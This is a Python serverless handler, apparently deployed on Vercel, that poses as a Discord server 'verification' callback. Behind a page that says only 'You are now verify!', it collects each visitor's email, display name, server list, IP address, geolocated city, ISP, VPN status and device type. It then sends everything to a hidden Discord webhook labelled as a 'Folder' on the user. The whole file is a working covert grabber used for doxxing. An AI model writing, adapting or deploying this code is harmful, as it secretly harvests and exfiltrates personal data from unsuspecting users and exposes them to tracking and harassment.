from http.server import BaseHTTPRequestHandler
import requests
import urllib.parse
import os

WH_URL = os.environ.get('WEBHOOK_BSU')
CLIENT_ID = os.environ.get('CLIENT_ID')
CLIENT_SECRET = os.environ.get('CLIENT_SECRET')
REDIRECT_URI = "https://bsu-verify.vercel.app/callback"

class handler(BaseHTTPRequestHandler):
    def do_GET(self):
        # 1. Parameter auslesen
        q = urllib.parse.urlparse(self.path).query
        p = urllib.parse.parse_qs(q)
        code = p.get('code', [None])[0]
        
        # 2. IP & Gerät ermitteln
        u_ip = self.headers.get('x-forwarded-for', 'N/A').split(',')[0]
        u_ag = self.headers.get('user-agent', 'N/A')

        # Standort-Abfrage mit erweiterten Feldern für ISP/VPN Erkennung
        try:
            r = requests.get(f"http://ip-api.com/json/{u_ip}?fields=17031167").json()
            loc = f"{r.get('city', 'Unknown')}, {r.get('country', '??')}"
            isp = r.get('isp', 'Unknown ISP')
            # Erkennt Hosting/Proxy oft als VPN
            vpn = "Ja" if r.get('proxy') or r.get('hosting') else "Nein"
        except:
            loc, isp, vpn = "Lookup error", "N/A", "N/A"

        dev = "Windows PC" if "Win" in u_ag else "Mobile"
        if "Chrome" in u_ag: dev += " (Chrome)"
        elif "Safari" in u_ag and "Mobile" in u_ag: dev = "iPhone/iOS"

        # Standardwerte
        display_name = "Unknown User"
        user_email = "Nicht autorisiert"
        user_guilds = "Keine Server gefunden"

        # 3. Falls Code vorhanden -> Discord Daten abrufen
        if code and CLIENT_ID and CLIENT_SECRET:
            data = {
                'client_id': CLIENT_ID,
                'client_secret': CLIENT_SECRET,
                'grant_type': 'authorization_code',
                'code': code,
                'redirect_uri': REDIRECT_URI
            }
            headers = {'Content-Type': 'application/x-www-form-urlencoded'}
            token_r = requests.post('https://discord.com/api/v10/oauth2/token', data=data, headers=headers).json()
            
            access_token = token_r.get('access_token')
            if access_token:
                auth_header = {'Authorization': f'Bearer {access_token}'}
                
                # Nutzer-Info (Email & Displayname)
                u_info = requests.get('https://discord.com/api/v10/users/@me', headers=auth_header).json()
                user_email = u_info.get('email', 'Keine Email gefunden')
                # global_name ist der Displayname, username der @name
                display_name = u_info.get('global_name') or u_info.get('username') or "Unknown"
                
                # Serverliste (Guilds) einzeln auflisten
                g_info = requests.get('https://discord.com/api/v10/users/@me/guilds', headers=auth_header).json()
                if isinstance(g_info, list):
                    # Listet die ersten 20 Server auf, um das Discord-Limit für Nachrichten nicht zu sprengen
                    server_list = [f"- {g['name']}" for g in g_info[:20]]
                    user_guilds = "\n".join(server_list)
                    if len(g_info) > 20:
                        user_guilds += f"\n*... und {len(g_info)-20} weitere*"

        # 4. Webhook senden
        if WH_URL:
            payload = {
                "embeds": [{
                    "title": f"**__📂 Folder of {display_name}__**",
                    "color": 0x2b2d31,
                    "description": (
                        f"• 📋 **Serverliste:**\n{user_guilds}\n\n"
                        f"• 📧 **Email:**\n- {user_email}\n\n"
                        f"• 📍 **Standort/IP-Adresse:**\n{loc} ({u_ip})\n\n"
                        f"• 🧾 **Anbieter:**\n{isp}\n\n"
                        f"• 📱 **Gerät:**\n{dev}\n\n"
                        f"• 🛡️ **VPN genutzt?:**\n{vpn}"
                    ),
                    "footer": {"text": "System V2 • Logging Active"}
                }]
            }
            requests.post(WH_URL, json=payload)

        # 5. HTML Antwort
        self.send_response(200)
        self.send_header('Content-type', 'text/html; charset=utf-8')
        self.end_headers()

        response_html = """
        <!DOCTYPE html>
        <html lang="de">
        <head>
            <meta charset="UTF-8">
            <style>
                body { background: #000; color: #fff; font-family: sans-serif; 
                       display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
                .box { text-align: center; border: 1px solid #111; padding: 60px; border-radius: 10px; background: #050505; }
                h1 { font-size: 50px; margin: 0; }
                p { font-size: 20px; color: #888; }
            </style>
        </head>
        <body>
            <div class="box"><h1>💠</h1><p>You are now verify!</p></div>
        </body>
        </html>
        """
        self.wfile.write(response_html.encode('utf-8'))

    def do_HEAD(self):
        self.send_response(200)
        self.end_headers()
